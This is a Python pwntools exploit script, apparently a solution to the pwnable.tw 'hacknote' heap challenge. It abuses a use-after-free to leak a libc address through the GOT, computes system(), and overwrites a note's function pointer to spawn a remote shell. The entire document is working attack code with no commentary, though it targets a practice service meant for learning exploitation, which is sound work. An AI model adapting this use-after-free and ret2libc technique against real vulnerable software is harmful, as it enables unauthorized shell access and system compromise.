from pwn import *
target=remote('chall.pwnable.tw',10102)
libc=ELF('libc_32.so.6')

def sla(string,val):
	target.sendlineafter(string,val)
def sa(string,val):
	target.sendafter(string,val)

def add(size,data="A"):
	sla("choice :",str(1))
	sla("size :",str(size))
	sa("Content :",data)
	
def delete(index):
	sla("choice :",str(2))
	sla("Index :",str(index))	
	
def leaks(index):
	sla("choice :",str(3))
	sla("Index :",str(index))	
	leak=target.recvline().strip("\n")
	return leak

add(0x28)#0
add(0x28)#1
add(0xe8)#2
delete(0)
delete(1)
delete(2)
puts_dup=0x804862B
puts_got=0x804a024
payload=p32(puts_dup)+p32(puts_got)
add(0x28,payload)#3
libc_puts=u32(leaks(0)[0:4])
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
payload=p32(libc_system)+";sh\x00"
add(0x20,payload)#4
sla("choice :",str(3))
sa("Index :",str(1))	
target.interactive()





